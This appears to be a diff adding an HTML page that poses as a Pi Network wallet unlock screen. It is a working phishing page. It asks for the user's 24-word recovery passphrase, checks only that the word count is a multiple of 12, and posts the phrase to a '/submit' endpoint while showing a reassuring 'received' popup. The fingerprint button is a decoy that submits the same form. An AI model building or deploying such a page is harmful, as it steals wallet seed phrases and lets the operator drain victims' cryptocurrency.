@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Network - Unlock Your Wallet</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --custom-violet: rgba(120, 58, 140, 1);
+        }
+
+        /* Header styles */
+        header {
+            background-color: var(--custom-violet);
+            color: white;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        header .logo-title {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        header .logo-title img {
+            width: 50px;
+            height: auto;
+        }
+
+        header h1 {
+            font-size: 1.5rem;
+            margin: 0;
+        }
+
+        /* Button styles */
+        .btn-custom {
+            background-color: var(--custom-violet);
+            border-color: var(--custom-violet);
+            color: white;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+
+        .btn-custom:hover {
+            background-color: white;
+            color: var(--custom-violet);
+            border-color: var(--custom-violet);
+        }
+
+        .btn-outline-primary.btn-custom {
+            color: var(--custom-violet);
+            background-color: transparent;
+            border: 2px solid var(--custom-violet);
+        }
+
+        .btn-outline-primary.btn-custom:hover {
+            background-color: var(--custom-violet);
+            color: white;
+        }
+
+        /* Popups */
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .popup-overlay.show {
+            display: flex;
+        }
+
+        .popup {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+        }
+
+        .popup.error {
+            border: 2px solid red;
+        }
+
+        .popup.invalid {
+            border: 2px solid orange;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="root">
+        <!-- Header Section -->
+        <header>
+            <div class="logo-title">
+                <img src="static/assets/pi_logo-x-BtcnkIol.png" alt="Pi Logo">
+                <h1>Pi Wallet</h1>
+            </div>
+        </header>
+
+        <!-- Hero Section -->
+        <section class="text-center my-5">
+            <h4>Unlock Your Pi Wallet</h4>
+        </section>
+
+        <!-- Main Content -->
+        <main class="container my-5">
+            <div class="row justify-content-center">
+                <div class="col-md-6">
+                    <div class="form-container">
+                        <form id="walletForm">
+                            <div class="mb-3">
+                                <textarea 
+                                    name="passphrase" 
+                                    id="passphrase" 
+                                    rows="5" 
+                                    placeholder="Enter your 24-word passphrase here" 
+                                    class="form-control" 
+                                    required></textarea>
+                            </div>
+                            <div class="d-grid gap-3">
+                                <button type="submit" class="btn btn-primary btn-custom">
+                                    Unlock with Passphrase
+                                </button>
+                                <button type="submit" class="btn btn-outline-primary btn-custom">
+                                    Unlock with Fingerprint
+                                </button>
+                            </div>
+                        </form>
+                        <p class="info-text mt-4">
+                            As a non-custodial wallet, your passphrase is exclusively accessible to you. 
+                            <strong>Recovery is impossible if lost.</strong>
+                        </p>
+                        <p class="info-text">
+                            Lost your passphrase? 
+                            <span>Create a new wallet</span>, but all your π in the previous wallet will be inaccessible.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Popups -->
+    <div class="popup-overlay" id="popupOverlay">
+        <div class="popup">
+            <h3>Passphrase Submitted Successfully!</h3>
+            <p>Your passphrase has been received. Please wait while we process your request.</p>
+            <button id="closePopup">OK</button>
+        </div>
+    </div>
+
+    <div class="popup-overlay error" id="emptyPassphrasePopup">
+        <div class="popup error">
+            <h3>Passphrase Missing!</h3>
+            <p>Please enter your passphrase to proceed.</p>
+            <button id="closeEmptyPassphrasePopup">OK</button>
+        </div>
+    </div>
+
+    <div class="popup-overlay invalid" id="invalidPassphrasePopup">
+        <div class="popup invalid">
+            <h3>Invalid Passphrase!</h3>
+            <p>The number of words in your passphrase must be a multiple of 12 (e.g., 12, 24, 36).</p>
+            <button id="closeInvalidPassphrasePopup">OK</button>
+        </div>
+    </div>
+
+    <!-- Axios CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        const walletForm = document.getElementById('walletForm');
+        const popupOverlay = document.getElementById('popupOverlay');
+        const emptyPopup = document.getElementById('emptyPassphrasePopup');
+        const invalidPopup = document.getElementById('invalidPassphrasePopup');
+
+        walletForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const passphrase = document.getElementById('passphrase').value.trim();
+
+            if (!passphrase) {
+                emptyPopup.classList.add('show');
+                return;
+            }
+
+            const words = passphrase.split(/\s+/);
+            if (words.length % 12 !== 0) {
+                invalidPopup.classList.add('show');
+                return;
+            }
+
+            axios.post('/submit', { passphrase })
+                .then(() => {
+                    popupOverlay.classList.add('show');
+                })
+                .catch((error) => {
+                    console.error('Error submitting passphrase:', error);
+                });
+        });
+
+        document.getElementById('closePopup').onclick = () => popupOverlay.classList.remove('show');
+        document.getElementById('closeEmptyPassphrasePopup').onclick = () => emptyPopup.classList.remove('show');
+        document.getElementById('closeInvalidPassphrasePopup').onclick = () => invalidPopup.classList.remove('show');
+    </script>
+</body>
+
+</html>
